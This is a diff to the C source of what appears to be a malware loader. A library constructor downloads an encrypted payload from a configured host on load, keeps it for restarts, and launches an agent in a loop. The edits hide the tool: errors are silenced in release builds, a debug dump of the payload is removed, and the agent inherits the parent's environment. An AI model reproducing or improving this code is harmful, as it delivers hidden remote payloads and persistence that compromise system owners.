@@ -37,8 +37,10 @@
 
 #ifdef DEBUG
 #define DEBUG_PRINT(fmt, args...) fprintf(stderr, "DEBUG: " fmt, ##args)
+#define DEBUG_PERROR(msg) perror(msg)
 #else
 #define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
+#define DEBUG_PERROR(msg) // Do nothing in release builds
 #endif
 
 // forward declarations
@@ -170,21 +172,21 @@ size_t download_file(const char *host, const char *port, const char *path,
   hints.ai_socktype = SOCK_STREAM;
 
   if (getaddrinfo(host, port, &hints, &res) != 0) {
-    perror("getaddrinfo");
+    DEBUG_PERROR("getaddrinfo");
     return 0;
   }
 
   // Create the socket
   sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
   if (sockfd == -1) {
-    perror("socket");
+    DEBUG_PERROR("socket");
     freeaddrinfo(res);
     return 0;
   }
 
   // Connect to the server
   if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1) {
-    perror("connect");
+    DEBUG_PERROR("connect");
     close(sockfd);
     freeaddrinfo(res);
     return 0;
@@ -199,7 +201,7 @@ size_t download_file(const char *host, const char *port, const char *path,
 
   // Send the request
   if (send(sockfd, request, strlen(request), 0) == -1) {
-    perror("send");
+    DEBUG_PERROR("send");
     close(sockfd);
     return 0;
   }
@@ -233,18 +235,6 @@ size_t download_file(const char *host, const char *port, const char *path,
   close(sockfd);
 
   DEBUG_PRINT("Received data of size: %zu\n", data_size);
-
-#ifdef DEBUG
-  // Save the original downloaded data to disk
-  FILE *file = fopen("/tmp/downloaded_data", "wb");
-  if (file) {
-    fwrite(*buffer, 1, data_size, file);
-    fclose(file);
-    DEBUG_PRINT("Downloaded data saved to /tmp/downloaded_data\n");
-  } else {
-    perror("fopen");
-  }
-#endif
 
   return data_size;
 }
@@ -339,12 +329,6 @@ void __attribute__((constructor)) initLibrary(void) {
   sigemptyset(&trap_sa.sa_mask);
   sigaction(SIGTRAP, &trap_sa, NULL);
 
-  // prevent self delete of agent
-  // see cmd/agent/main.go
-  setenv("PERSISTENCE", "true", 1);
-  // tell agent not to change argv
-  setenv("LD", "true", 1);
-
   // update with the correct host, port, path, and key string
   const char *host = DOWNLOAD_HOST;
   const char *port = DOWNLOAD_PORT;
@@ -361,20 +345,10 @@ void __attribute__((constructor)) initLibrary(void) {
   // keep the encrypted payload for future restarts
   DEBUG_PRINT("Encrypted payload stored: %zu bytes\n", enc_size);
 
-  char *verbose = calloc(13, sizeof(char));
-  snprintf(verbose, 13, "VERBOSE=%s", getenv("VERBOSE"));
-
   char *argv[] = {"", NULL};
-  char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
-                  "HOME=/tmp",
-                  "PERSISTENCE=true",
-                  "LD=true",
-#ifdef DEBUG
-                  "VERBOSE=true",
-#else
-                  verbose,
-#endif
-                  NULL};
+  // Inherit environment from parent process
+  extern char **environ;
+  char **envv = environ;
 
   while (1) {
     g_trap_requested = 0;
